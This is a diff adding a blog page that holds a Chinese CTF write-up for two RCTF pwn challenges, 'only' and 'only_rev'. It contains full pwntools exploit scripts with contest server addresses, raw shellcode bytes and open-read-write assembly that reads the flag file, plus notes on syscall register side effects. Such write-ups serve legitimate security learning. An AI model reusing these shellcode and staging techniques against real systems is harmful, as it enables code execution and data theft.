@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="zach0ry">
+    
+    <title>
+        
+            RCTF |
+        
+        b1nary
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/fire.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"b1nary","author":"zach0ry","avatar":"/images/author.jpg","logo":"/images/fire.svg","favicon":"/images/fire.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                  || fa-solid fa-tags","categories":"/categories      || fa-solid fa-layer-group"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":null,"enable":true,"level_badge":true,"custom_badge":["炼气","筑基","结丹","元婴","化神","渡劫","大乘"],"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"search":{"path":"search.json","field":"post","content":true,"format":"striptags"},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/fire.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               b1nary
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-layer-group"></i>
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-layer-group"></i>
+                                </span>
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        RCTF
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/author.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">zach0ry</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-11-24</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Nov 24 2025 16:03:03 GMT+0800">2025-11-24</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/WP/">WP</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/WP/">WP</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/gdb/">gdb</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p><a class="link"   target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/match/list?event_hash=5ec90120-bec4-11f0-bf63-000c297261bb" >攻防世界RCTF<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="only"><a href="#only" class="headerlink" title="only"></a>only</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/77008894-ade6-4f82-a9f5-5d463d5f03b6.png" ></p>
+<p>没有nx保护，用shellcode</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/5bb1eeb4018d735f588f8f46a0c2938f.png"  alt="5bb1eeb4018d735f588f8f46a0c2938f"></p>
+<p>sla(b”input:”, b”8.592564544313935e-246”)进入gift函数</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/5bb6095d3547949638eec69de89e9e02.png"  alt="5bb6095d3547949638eec69de89e9e02"></p>
+<p>执行addr时会把寄存器清零</p>
+<p>设计read函数</p>
+<p>read(0, addr, count)</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/89a386a7a17cb8ddfca4717ec8e90c6c.png"  alt="89a386a7a17cb8ddfca4717ec8e90c6c"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/19b2d71415db8c7c188c3cf9e8c825dd.png"  alt="19b2d71415db8c7c188c3cf9e8c825dd"></p>
+<p>之后继续构造shellcode接在后面</p>
+<p>Shellcraft远端没成功</p>
+<p>直接用orw</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">file_path = &quot;./chal&quot;</span><br><span class="line">remote_host = &quot;101.245.98.115&quot;</span><br><span class="line">remote_port = 26100</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;cmd.exe&quot;, &quot;/c&quot;,</span><br><span class="line">    &quot;start&quot;, &quot;/max&quot;, &quot;&quot;, &quot;wt.exe&quot;,</span><br><span class="line">    &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;--&quot;, &quot;wsl&quot;, &quot;bash&quot;, &quot;-lc&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = elf.libc</span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">    #gdb.attach(p,&quot;b read&quot;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause() </span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line">def ru(a):</span><br><span class="line">    p.recvuntil(a)</span><br><span class="line">def sa(a, b):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line">sla(b&quot;3.exit&quot;,str(2))</span><br><span class="line">sla(b&quot;input:&quot;, b&quot;8.592564544313935e-246&quot;)</span><br><span class="line">sla(b&quot;Make a choice:&quot;,str(1))</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">pop </span><br><span class="line">pop </span><br><span class="line">pop rdx</span><br><span class="line">pop </span><br><span class="line">pop rax    </span><br><span class="line">pop rsi    </span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload=b&#x27;\x5b\x5b\x5a\x5b\x58\x5e\x0f\x05&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">#shell=shellcraft.sh()</span><br><span class="line">shell= &#x27;&#x27;&#x27;</span><br><span class="line">push 0x67616c66</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    xor esi,esi</span><br><span class="line">    push 2</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi,rax</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    mov edx,0x100</span><br><span class="line">    xor eax,eax</span><br><span class="line">    syscall</span><br><span class="line">    mov edi,1</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    push 1</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">payload=b&#x27;\x90&#x27;*(0x32)+asm(shell)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="only-rev"><a href="#only-rev" class="headerlink" title="only_rev"></a>only_rev</h2><p>本解题思路参考了<a class="link"   target="_blank" rel="noopener" href="https://blog.xmcve.com/2025/11/18/RCTF2025-Writeup/#title-3" >星盟安全团队<i class="fas fa-external-link-alt"></i></a></p>
+<p>前面和only一样，但是</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251124145752734.png"  alt="image-20251124145752734"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add rsp,0x12345678</span><br><span class="line">add rbp,0x12345678</span><br><span class="line">// 输入</span><br><span class="line">sub rsp,0x12345678</span><br><span class="line">sub rbp,0x12345678</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251124150150884.png"  alt="image-20251124150150884"></p>
+<p>最开始的时候无可以利用的</p>
+<p>执行该命令实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pay = b&quot;&quot;&quot;</span><br><span class="line">    syscall</span><br><span class="line">    mov rsi, rcx</span><br><span class="line">    add rdx, 0xff</span><br><span class="line">    syscall</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>在 x86-64 Linux 上执行 <code>syscall</code> 时，CPU 会把<strong>下一条指令地址</strong>保存到 <code>RCX</code>（还会保存 flags 到 <code>R11</code>），这是指令语义规定的副作用。</p>
+<p>你这里“寄存器全 0”的意思是：</p>
+<ul>
+<li><code>RAX=0</code> → 系统调用号 0，即 <code>read</code></li>
+<li><code>RDI=0</code> → fd&#x3D;0（stdin）</li>
+<li><code>RSI=0</code></li>
+<li><code>RDX=0</code></li>
+</ul>
+<p>所以第一个 <code>syscall</code> 等价于执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;read(0, NULL, 0);</span><br></pre></td></tr></table></figure>
+
+<p>它实际什么都不读（长度 0），马上返回；<strong>但返回时 RCX 被写成“syscall 后面那条指令的 RIP”</strong>，也就是你 rwx 区域里当前代码的位置。</p>
+<p>结果：<code>RCX</code> 里拿到了 rwx 区域地址。</p>
+</blockquote>
+<p>初次syscall之后</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251124150424895.png"  alt="image-20251124150424895"></p>
+<p>控制read之后</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251124150526536.png"  alt="image-20251124150526536"></p>
+<p>之后就是写入read就好</p>
+<p>写入是在3a的位置，但是我们该执行41了,所以填充7个字节道要执行的位置</p>
+<p>编写orw</p>
+<p>用到了push等操作</p>
+<p>所以先让栈飞回去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">orw = &#x27;&#x27;&#x27;</span><br><span class="line">sub rbp,0x12345678</span><br><span class="line">sub rsp,0x12345678</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rsi,rsi</span><br><span class="line">mov rax,2</span><br><span class="line">syscall</span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,0x50</span><br><span class="line">xor rax,rax</span><br><span class="line">syscall</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,0x50</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode = b&quot;\x00&quot;*7 + asm(orw)</span><br></pre></td></tr></table></figure>
+
+<p>完整脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @file: exp.py</span><br><span class="line"># @author: fuchen</span><br><span class="line"># @contact: MTM3MjIwMzYwQHFxLmNvbQ==</span><br><span class="line"># @created: 2025-11-15</span><br><span class="line"># @description: Pwn exploit template for CTF challenges</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">LOCAL = True</span><br><span class="line">BINARY = &quot;./chal&quot;</span><br><span class="line">LIBC = &quot;./libc.so.6&quot;</span><br><span class="line"></span><br><span class="line">HOST = &quot;1.95.164.64&quot;</span><br><span class="line">PORT = 26000</span><br><span class="line"></span><br><span class="line">def setup():</span><br><span class="line">    if LOCAL:</span><br><span class="line">        return process(BINARY)</span><br><span class="line">    else:</span><br><span class="line">        return remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(data)</span><br><span class="line">sa      = lambda delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :p.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = lambda num=4096           :p.recv(num)</span><br><span class="line">ru      = lambda delims, drop=False  :p.recvuntil(delims, drop)</span><br><span class="line">rl      = lambda                    :p.recvline()</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4, b&#x27;\0&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8, b&#x27;\0&#x27;))</span><br><span class="line">uu16    = lambda data               :u16(data.ljust(2, b&#x27;\0&#x27;))</span><br><span class="line">uu8     = lambda data               :u8(data)</span><br><span class="line">leak    = lambda name,addr          :log.success(f&quot;&#123;name&#125; = &#123;hex(addr)&#125;&quot;)</span><br><span class="line">dbg     = lambda cmd=&#x27;&#x27;             :gdb.attach(p, cmd)</span><br><span class="line">def notes():</span><br><span class="line">    sla(b&quot;3.exit\n&quot;,b&quot;1&quot;)</span><br><span class="line">def add(size):</span><br><span class="line">    sla(b&quot;5.back\n&quot;,b&quot;1&quot;)</span><br><span class="line">    sla(b&quot;size:&quot;,str(size).encode())</span><br><span class="line">def delete():</span><br><span class="line">    sla(b&quot;5.back\n&quot;,b&quot;2&quot;)</span><br><span class="line">def save(filename):</span><br><span class="line">    sla(b&quot;5.back\n&quot;,b&quot;3&quot;)</span><br><span class="line">    sl(b&quot;filename: &quot;,filename)</span><br><span class="line">def edit():</span><br><span class="line">    sla(b&quot;5.back\n&quot;,b&quot;4&quot;)</span><br><span class="line">def back():</span><br><span class="line">    sla(b&quot;5.back\n&quot;,b&quot;4&quot;)</span><br><span class="line">def bookkeeping():</span><br><span class="line">    sla(b&quot;3.exit\n&quot;,b&quot;2&quot;)</span><br><span class="line">    sla(b&quot;input:\n&quot;,str(8.592564544313935e-246).encode())</span><br><span class="line">def runcode(content):</span><br><span class="line">    sla(b&quot;Make a choice:&quot;,b&quot;1&quot;)</span><br><span class="line">    sa(b&quot;your code:&quot;,content)</span><br><span class="line">def getcanary():</span><br><span class="line">    sla(b&quot;Make a choice:&quot;,b&quot;2&quot;)</span><br><span class="line">def exploit():</span><br><span class="line">    global p</span><br><span class="line">    p = setup()</span><br><span class="line">    </span><br><span class="line">    elf = ELF(BINARY)</span><br><span class="line">    libc = ELF(LIBC) if LIBC else None</span><br><span class="line">    #dbg(&#x27;b *$rebase(0x1a79)&#x27;)</span><br><span class="line">    #pause()</span><br><span class="line">    bookkeeping()</span><br><span class="line">    payload = b&quot;\x0f\x05\x48\x89\xce\xb2\xff\x0f\x05&quot;</span><br><span class="line">    runcode(payload)</span><br><span class="line">    orw = &#x27;&#x27;&#x27;</span><br><span class="line">    sub rbp,0x12345678</span><br><span class="line">    sub rsp,0x12345678</span><br><span class="line">    push 0x67616c66</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    mov rax,2</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi,rax</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    mov rdx,0x50</span><br><span class="line">    xor rax,rax</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi,1</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    mov rdx,0x50</span><br><span class="line">    mov rax,1</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    shellcode = b&quot;\x00&quot;*7 + asm(orw)</span><br><span class="line">    sleep(1)</span><br><span class="line">    sl(shellcode)</span><br><span class="line">    #pause()</span><br><span class="line">    </span><br><span class="line">    itr()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        exploit()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        log.error(f&quot;Exploit failed: &#123;e&#125;&quot;)</span><br><span class="line">        if &#x27;p&#x27; in globals():</span><br><span class="line">            p.close()</span><br><span class="line">        raise</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<blockquote>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251124145905158.png"  alt="image-20251124145905158">add之后ebp，esp的范围不在映射范围内</p>
+<h2 id="为什么push-pop-call-无法执行"><a href="#为什么push-pop-call-无法执行" class="headerlink" title="为什么push/pop/call 无法执行"></a>为什么<code>push/pop/call</code> 无法执行</h2><p>这些指令都会隐式访问 <code>[rsp]</code> 附近地址：</p>
+<ul>
+<li><code>push x</code>：先 <code>rsp -= 8</code>，再写 <code>[rsp]</code></li>
+<li><code>pop x</code>：先读 <code>[rsp]</code>，再 <code>rsp += 8</code></li>
+<li><code>call addr</code>：等价于 <code>push rip_next; jmp addr</code></li>
+<li><code>ret</code>：等价于 <code>pop rip</code></li>
+</ul>
+<p>但现在 <code>[rsp]</code> 就是 unmapped，任何一次读&#x2F;写都会 page fault。</p>
+</blockquote>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/WP/">WP</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/gdb/">gdb</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
